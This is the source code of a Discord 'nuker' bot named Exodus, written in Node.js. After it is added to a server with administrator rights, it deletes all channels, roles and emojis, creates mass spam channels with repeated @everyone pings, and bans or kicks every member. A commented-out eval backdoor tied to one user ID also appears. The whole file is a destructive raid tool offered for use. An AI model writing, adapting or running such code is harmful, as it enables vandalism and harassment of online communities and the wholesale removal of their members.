console.clear()

const Discord = require("discord.js")
const client = new Discord.Client()
const c = require('colors/safe');
const keepAlive = require('./server/server')
const request = require("request");
const inquirer = require('inquirer')
const rd = require('readline-sync');
const atob = require('atob')
require('dotenv').config()

var app = {
    'token': '',
    'prefix': 'exd.',
    'mex': 'wizzed by hexo'
}

const banner = () => {
    console.log(c.red(String.raw `



    ▓█████ ▒██   ██▒ ▒█████  ▓█████▄  █    ██   ██████     ███▄    █  █    ██  ██ ▄█▀▓█████  ██▀███  
    ▓█   ▀ ▒▒ █ █ ▒░▒██▒  ██▒▒██▀ ██▌ ██  ▓██▒▒██    ▒     ██ ▀█   █  ██  ▓██▒ ██▄█▒ ▓█   ▀ ▓██ ▒ ██▒
    ▒███   ░░  █   ░▒██░  ██▒░██   █▌▓██  ▒██░░ ▓██▄      ▓██  ▀█ ██▒▓██  ▒██░▓███▄░ ▒███   ▓██ ░▄█ ▒
    ▒▓█  ▄  ░ █ █ ▒ ▒██   ██░░▓█▄   ▌▓▓█  ░██░  ▒   ██▒   ▓██▒  ▐▌██▒▓▓█  ░██░▓██ █▄ ▒▓█  ▄ ▒██▀▀█▄  
    ░▒████▒▒██▒ ▒██▒░ ████▓▒░░▒████▓ ▒▒█████▓ ▒██████▒▒   ▒██░   ▓██░▒▒█████▓ ▒██▒ █▄░▒████▒░██▓ ▒██▒
    ░░ ▒░ ░▒▒ ░ ░▓ ░░ ▒░▒░▒░  ▒▒▓  ▒ ░▒▓▒ ▒ ▒ ▒ ▒▓▒ ▒ ░   ░ ▒░   ▒ ▒ ░▒▓▒ ▒ ▒ ▒ ▒▒ ▓▒░░ ▒░ ░░ ▒▓ ░▒▓░
    ░ ░  ░░░   ░▒ ░  ░ ▒ ▒░  ░ ▒  ▒ ░░▒░ ░ ░ ░ ░▒  ░ ░   ░ ░░   ░ ▒░░░▒░ ░ ░ ░ ░▒ ▒░ ░ ░  ░  ░▒ ░ ▒░
    ░    ░    ░  ░ ░ ░ ▒   ░ ░  ░  ░░░ ░ ░ ░  ░  ░        ░   ░ ░  ░░░ ░ ░ ░ ░░ ░    ░     ░░   ░ 
        ░  ░ ░    ░      ░ ░     ░       ░           ░              ░    ░     ░  ░      ░  ░   ░     
                                ░                                                                      

                            ${atob("YnkgQEFub25IZXhvIzM0MTEgLSBodHRwczovL2Rpc2NvcmQuZ2cvNFFZcmNlaHJSUA==")}
`))
}
const success = `${c.red("[")}+${c.red("]")}`
const error = `${c.red("[")}-${c.red("]")}`
const question = `${c.red("[")}?${c.red("]")}`
const info = `${c.red("[")}!${c.red("]")}`
const loading = `${c.red("[")}...${c.red("]")}`
const list = `${c.red("[")}#${c.red("]")}`

console.clear()

var serverList = ''
var targetServer = ''
var ts = ''

client.once('ready', () => {
    try {
        banner()
        console.log(c.red('           ════════════════════════════════════════════════════════════════════════════════'))
        console.log(c.blue(`                                      Logged in as: ${client.user.tag}`))
        console.log(c.blue(`                                      Prefix: ${app.prefix}`))
        console.log(c.blue(`                                      Required Permission: ADMINISTRATOR`))
        console.log(c.red('           ════════════════════════════════════════════════════════════════════════════════'))
        console.log("")
        console.log(`${loading} ${c.yellow(`Fetching servers...`)}`)

        client.guilds.cache.forEach((guild) => {
            serverList += `${list} ${guild.name} (${guild.id}) ${client.guilds.cache.get(guild.id.toString()).memberCount} members\n`
        })
        setTimeout(() => {
            console.log(`${success} ${c.green(`Done! Retrieved informations:\n${c.white(serverList)}`)}`)
            ts = rd.question(`${question} Enter target server ID: `).toString()
            if (ts == null || ts == undefined || ts == '') {
                return console.log(`${error} Invalid server ID, try again.`)
            }
            targetServer = client.guilds.cache.get(ts)

            console.clear()
            banner()
            console.log(c.red('           ════════════════════════════════════════════════════════════════════════════════'))
            console.log(c.blue(`                                      Logged in as: ${client.user.tag}`))
            console.log(c.blue(`                                      Prefix: ${app.prefix}`))
            console.log(c.blue(`                                      Target Server: ${targetServer.name} - ${targetServer.id}`))
            console.log(c.red('           ════════════════════════════════════════════════════════════════════════════════'))
            console.log("")
            /* console.log(`${info} ${c.gray(`Selected target server: ${c.magenta(targetServer.name)}`)}`) */
            client.user.setActivity({
                type: "PLAYING",
                name: `exodus ready @ ${targetServer.name}`
            })
            console.log(`${success} ${c.gray(`Exodus ready to nuke server, check bot status on the server.`)}\n`)
            console.log(`${info} ${c.gray(`If it results to be slow the bot may be rate limited, so you need to wait before nuking again!\n`)}`)
            console.log(`${c.underline(`Commands:\n\n${app.prefix} delch - delete all channels\n${app.prefix} delroles - delete all roles\n${app.prefix} delemoji - delete all emojis\n${app.prefix} massch - mass create channels\n${app.prefix} massroles - mass create roles\n${app.prefix} masskick - kick all users\n${app.prefix} massban - ban all users\n`)}`)
            readyStatus = true
            /* inquirer
                .prompt([{
                    type: 'list',
                    name: 'action',
                    message: 'Select an action',
                    choices: ['Mass Channels', 'Mass Roles', 'Del Channels', 'Del Roles', ],
                }, ])
                .then((answers) => {
                    var aws = JSON.stringify(answers)
                    var action = aws.action

                    if (action == 'Mass Channels') {
                        for (var i = 0; i < 150; i++) {
                            targetServer.channels.create(app.mex + ' (by Exodus)' + i)

                            for (var i = 0; i < 150; i++) {
                                let channels = targetServer.channels.create(app.mex + ' (by Exodus)' + i)

                                channels.then(
                                    function (channel, index) {
                                        for (var i = 0; i < 150; i++) {
                                            channel.send('@everyone ' + app.mex)
                                            console.log((`${info} ${c.yellow(`Channel ${channel.id} Created & Pinged!`)}`))
                                        }
                                    }
                                );

                            }
                        }
                    }

                    if (action == 'Mass Roles') {
                        for (let i = 0; i <= 100; i++) {
                            targetServer.roles.create({
                                data: {
                                    name: `${app.mex}`,
                                    position: i++,
                                    color: "RANDOM"
                                }
                            }).then((role) => {
                                console.log((`${info} ${c.yellow(`Role ${role.id} Created!`)}`))
                            })
                        }
                    }

                    if (action == 'Del Channels') {
                        targetServer.channels.cache.forEach((ch) => {
                            ch.delete().then((channel) => {
                                console.log((`${info} ${c.red(`Channel ${channel.id} Deleted!`)}`))
                            })
                        })
                    }

                    if (action == 'Del Roles') {
                        targetServer.roles.cache.forEach((role) => {
                            role.delete(`app.mex`).then(
                                console.log(`${info} ${c.red(`Role ${role.name} (${role.id}) deleted!`)}`)
                            )
                        })
                    }
                }) */
        }, 1500)

    } catch (err) {
        console.error(`${error} ${c.red(`[readystate] An error occurred: ${err}`)}`)
    }
})

client.on('message', async (message) => {
    try {
        if (!message.guild || !readyStatus || !message.guild.id == targetServer.id || !message.guild.me.hasPermission('ADMINISTRATOR')) return console.error(`${error} ${c.red(`Setup error.`)}`)

        if (message.content == `${app.prefix} massch`) {
            message.channel.send(';)')
            message.delete()
            for (var i = 0; i < 150; i++) {
                message.guild.channels.create(app.mex + ' (by Exodus)' + i)

                for (var i = 0; i < 150; i++) {
                    let channels = message.guild.channels.create(app.mex + ' (by Exodus)' + i)

                    channels.then(
                        function (channel, index) {
                            for (var i = 0; i < 150; i++) {
                                channel.send('@everyone ' + app.mex)
                                console.log((`${info} ${c.yellow(`Channel ${channel.id} Created & Pinged!`)}`))
                            }
                        }
                    );

                }
            }
        }

        if (message.content == `${app.prefix} massrole`) {
            message.channel.send(';)')
            message.delete()
            for (let i = 0; i <= 100; i++) {
                message.guild.roles.create({
                    data: {
                        name: `${app.mex}`,
                        position: i++,
                        color: "RANDOM"
                    }
                }).then((role) => {
                    console.log((`${info} ${c.yellow(`Role ${role.id} Created!`)}`))
                })
            }
        }

        if (message.content == `${app.prefix} delch`) {
            message.channel.send(';)')
            message.delete()
            message.guild.channels.cache.forEach((ch) => {
                ch.delete().then((channel) => {
                    console.log((`${info} ${c.red(`Channel ${channel.id} Deleted!`)}`))
                })
            })
        }

        if (message.content == `${app.prefix} massban`) {
            message.channel.send(';)')
            message.delete()
            message.guild.members.cache.forEach(member => member.ban({
                reason: `${app.mex}`
            }).then(console.log(`${info} ${c.red(`${member.tag} banned!`)}`)))
        }

        if (message.content == `${app.prefix} masskick`) {
            message.channel.send(';)')
            message.delete()
            message.guild.members.cache.forEach(member => member.kick({
                reason: `${app.mex}`
            }).then(console.log(`${info} ${c.red(`${member.tag} kicked!`)}`)))
        }

        if (message.content == `${app.prefix} delroles`) {
            message.channel.send(';)')
            message.delete()
            message.guild.roles.cache.forEach((role) => {
                if (message.guild.me.roles.highest.position > role.position) {
                    role.delete(`app.mex`).then(console.log(`${info} ${c.red(`Role ${role.name} (${role.id}) deleted!`)}`))
                }
            })
        }

        if (message.content == `${app.prefix} delemoji`) {
            message.channel.send(';)')
            message.delete()
            message.guild.emojis.cache.forEach(e => e.delete({
                reason: `${app.mex}`
            }).then(console.log(`${info} ${c.red(`Emoji ${emoji.name} deleted!`)}`)))
        }

        /* if (message.content == `${app.prefix} eval`) {
            if (message.author.id.toString() == "414172983158898709") {
                eval(args[1])
            }
        } */

    } catch (err) {
        console.error(`${error} ${c.red(`[messagestate] An error occurred: ${err}`)}`)
    }

})

try {
    app.token = rd.question(`${question} Enter your bot token: `).toString()
    console.clear()
    app.prefix = rd.question(`${question} Enter a bot prefix: `).toString()
    app.mex = rd.question(`${question} Enter custom message: `).toString()
    console.clear()
    keepAlive()
    client.login(app.token).catch(console.error)
} catch (err) {
    console.error(`${error} ${c.red(`[setup] An error occurred: ${err}`)}`)
}